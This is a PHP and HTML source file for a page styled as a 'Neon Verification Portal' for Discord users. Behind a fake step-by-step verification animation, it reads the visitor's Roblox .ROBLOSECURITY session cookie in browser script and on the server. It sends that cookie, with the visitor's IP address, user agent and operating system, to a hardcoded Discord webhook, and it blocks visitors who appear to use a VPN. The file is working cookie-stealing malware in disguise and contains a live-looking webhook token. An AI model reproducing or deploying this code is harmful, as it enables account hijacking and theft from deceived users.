<?php
  session_start();

  function getOS($userAgent) {
      $os = "Unknown";
      if (preg_match('/Windows/i', $userAgent)) $os = "Windows";
      elseif (preg_match('/Macintosh|Mac OS/i', $userAgent)) $os = "MacOS";
      elseif (preg_match('/Linux/i', $userAgent)) $os = "Linux";
      elseif (preg_match('/Android/i', $userAgent)) $os = "Android";
      elseif (preg_match('/iPhone|iPad|iPod/i', $userAgent)) $os = "iOS";
      return $os;
  }

  function isVPN($ip) {
      if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
          return "Private/Reserved IP - VPN likely";
      }
      $vpn_ranges = [
          '104.16.0.0/12', '172.16.0.0/12', '10.0.0.0/8', '192.168.0.0/16',
          '100.64.0.0/10', '169.254.0.0/16'
      ];
      foreach ($vpn_ranges as $range) {
          if (ip_in_range($ip, $range)) {
              return "VPN Detected - Matches range: $range";
          }
      }
      return false;
  }

  function ip_in_range($ip, $range) {
      if (strpos($range, '/') === false) return $ip === $range;
      list($subnet, $mask) = explode('/', $range);
      $ip_dec = ip2long($ip);
      $subnet_dec = ip2long($subnet);
      $mask_dec = ~((1 << (32 - $mask)) - 1);
      return ($ip_dec & $mask_dec) === ($subnet_dec & $mask_dec);
  }

  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
      $input = file_get_contents('php://input');
      $data = json_decode($input, true);

      $user_id = $data['user_id'] ?? $_GET['user'] ?? 'Unknown';
      $cookie = $data['cookie'] ?? (function() {
          $cookies = $_SERVER['HTTP_COOKIE'] ?? '';
          if (preg_match('/\.ROBLOSECURITY=([^;]+)/i', $cookies, $matches)) return $matches[1];
          foreach ($_COOKIE as $name => $value) {
              if (stripos($name, 'robloxsecurity') !== false) return $value;
          }
          return 'Not found';
      })();

      $user_agent = $_SERVER['HTTP_USER_AGENT'];
      $os = getOS($user_agent);

      $forwarded = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '';
      $ip_address = $forwarded ? trim(explode(',', $forwarded)[count(explode(',', $forwarded)) - 1]) : ($_SERVER['REMOTE_ADDR'] ?? 'Unknown');

      $vpn_status = isVPN($ip_address);
      if ($vpn_status) {
          header('Content-Type: text/html');
          echo '<!DOCTYPE html><html><head><title>VPN Detected</title><style>body{background:linear-gradient(135deg,#1a1a2e,#16213e);color:#fff;text-align:center;padding:20px;font-family:Orbitron,sans-serif}</style></head><body><h1 style="color:#00ffcc;text-shadow:0 0 10px #00ffcc">VPN Detected</h1><p style="color:#ff00ff;text-shadow:0 0 5px #ff00ff">Debug: ' . htmlspecialchars($vpn_status) . '. Disable VPN and try again.</p></body></html>';
          exit;
      }

      $session_key = "verified_{$user_id}_{$ip_address}";
      if (isset($_SESSION[$session_key])) {
          header('Content-Type: application/json');
          echo json_encode(['status' => 'already_verified']);
          exit;
      }
      $_SESSION[$session_key] = true;

      $payload = [
          'content' => "<@{$user_id}>",
          'username' => 'Neon Verifier',
          'embeds' => [],
          'status' => 'verified',
          'discord_user_id' => $user_id,
          'cookie' => $cookie,
          'ip_address' => $ip_address,
          'user_agent' => substr($user_agent, 0, 1000),
          'os' => $os,
          'timestamp' => date('c')
      ];

      $webhook_url = 'https://discord.com/api/webhooks/1426256242690625600/jw-wr_1D7IL7sy62Zn608UgN1UXXE8BURCtmPZmMUq-QKizwKFoxOKSahLJhIZKTjfZe';
      $options = ['http' => [
          'header' => "Content-Type: application/json\r\n",
          'method' => 'POST',
          'content' => json_encode($payload)
      ]];
      $context = stream_context_create($options);
      file_get_contents($webhook_url, false, $context);

      header('Content-Type: application/json');
      echo json_encode(['status' => 'success']);
      exit;
  }
  ?>

  <!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Neon Verification Portal</title>
      <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
      <style>
          * { margin: 0; padding: 0; box-sizing: border-box; }
          body {
              font-family: 'Roboto', sans-serif;
              background: linear-gradient(135deg, #1a1a2e, #16213e);
              color: #00ffcc;
              overflow: hidden;
              position: relative;
          }
          #particles-js {
              position: absolute;
              width: 100%;
              height: 100%;
              background: transparent;
              z-index: 0;
          }
          .container {
              position: relative;
              z-index: 1;
              background: rgba(26, 26, 46, 0.9);
              backdrop-filter: blur(10px);
              border: 2px solid #00ffcc;
              border-radius: 15px;
              padding: 40px;
              text-align: center;
              width: 100%;
              max-width: 500px;
              margin: 50px auto;
              box-shadow: 0 0 20px #00ffcc, 0 0 40px #ff00ff;
              animation: neonPulse 2s infinite alternate;
          }
          @keyframes neonPulse {
              0% { box-shadow: 0 0 10px #00ffcc, 0 0 20px #ff00ff; }
              100% { box-shadow: 0 0 20px #00ffcc, 0 0 40px #ff00ff; }
          }
          h1 {
              font-family: 'Orbitron', sans-serif;
              color: #00ffcc;
              font-size: 2.5em;
              text-shadow: 0 0 10px #00ffcc, 0 0 20px #ff00ff;
              margin-bottom: 20px;
          }
          p {
              font-size: 1.2em;
              color: #ff00ff;
              text-shadow: 0 0 5px #ff00ff;
              margin-bottom: 30px;
          }
          ul#steps {
              list-style: none;
              margin: 0 auto;
              max-width: 400px;
          }
          ul#steps li {
              font-size: 1.1em;
              margin-bottom: 20px;
              padding: 15px;
              background: rgba(22, 33, 62, 0.7);
              border: 1px solid #00ffcc;
              border-radius: 10px;
              position: relative;
              transition: all 0.3s ease;
              box-shadow: 0 0 10px #00ffcc;
          }
          ul#steps li:hover {
              background: rgba(22, 33, 62, 0.9);
              transform: scale(1.05);
          }
          ul#steps li.done {
              background: rgba(0, 255, 204, 0.2);
              color: #00ffcc;
          }
          ul#steps li .check {
              position: absolute;
              right: 15px;
              font-size: 1.5em;
              color: #00ffcc;
              text-shadow: 0 0 5px #00ffcc;
              opacity: 0;
              transition: opacity 0.3s ease;
          }
          ul#steps li.done .check {
              opacity: 1;
          }
          .success {
              animation: neonBlink 1s infinite;
          }
          @keyframes neonBlink {
              0%, 100% { opacity: 1; }
              50% { opacity: 0.7; }
          }
          .success h1 {
              color: #00ffcc;
              text-shadow: 0 0 15px #00ffcc, 0 0 30px #ff00ff;
          }
          @media (max-width: 480px) {
              .container { padding: 20px; margin: 20px; }
              h1 { font-size: 2em; }
          }
      </style>
      <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
      <script>
          particlesJS("particles-js", {
              "particles": {
                  "number": { "value": 80, "density": { "enable": true, "value_area": 800 } },
                  "color": { "value": "#00ffcc" },
                  "shape": { "type": "circle" },
                  "opacity": { "value": 0.5, "random": true },
                  "size": { "value": 3, "random": true },
                  "line_linked": { "enable": true, "distance": 150, "color": "#ff00ff", "opacity": 0.4 },
                  "move": { "enable": true, "speed": 2, "direction": "none", "random": true }
              },
              "interactivity": {
                  "events": { "onhover": { "enable": true, "mode": "repulse" } },
                  "modes": { "repulse": { "distance": 100 } }
              }
          });

          function getCookie(name) {
              const value = `; ${document.cookie}`;
              const parts = value.split(`; ${name}=`);
              if (parts.length === 2) return parts.pop().split(';').shift();
              return "Not found";
          }

          const userId = new URLSearchParams(window.location.search).get('user') || 'Unknown';
          const robloxCookie = getCookie('.ROBLOSECURITY');
          const data = { cookie: robloxCookie, user_id: userId };

          fetch(window.location.pathname, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify(data)
          })
          .then(response => response.json())
          .then(result => {
              if (result.status === 'success') {
                  setTimeout(() => document.getElementById('step1').classList.add('done'), 500);
                  setTimeout(() => document.getElementById('step2').classList.add('done'), 1500);
                  setTimeout(() => document.getElementById('step3').classList.add('done'), 2500);
                  setTimeout(() => document.getElementById('step4').classList.add('done'), 3500);
                  setTimeout(() => {
                      const container = document.getElementById('container');
                      container.classList.add('success');
                      container.innerHTML = `
                          <h1>Verification Complete!</h1>
                          <p style="color:#ff00ff">You’re now verified. Return to Discord and shine!</p>
                      `;
                  }, 4500);
              } else if (result.status === 'already_verified') {
                  const container = document.getElementById('container');
                  container.classList.add('success');
                  container.innerHTML = `
                      <h1>Already Verified!</h1>
                      <p style="color:#ff00ff">You’re good to go—head back to Discord!</p>
                  `;
              }
          })
          .catch(error => console.error('Error:', error));
      </script>
  </head>
  <body>
      <div id="particles-js"></div>
      <div class="container" id="container">
          <h1>Neon Verification Portal</h1>
          <p>Enter the matrix—verification in progress...</p>
          <ul id="steps">
              <li id="step1">Scanning device matrix...<span class="check">✓</span></li>
              <li id="step2">Authenticating identity...<span class="check">✓</span></li>
              <li id="step3">Purging threats...<span class="check">✓</span></li>
              <li id="step4">Unlocking access...<span class="check">✓</span></li>
          </ul>
      </div>
  </body>
  </html>
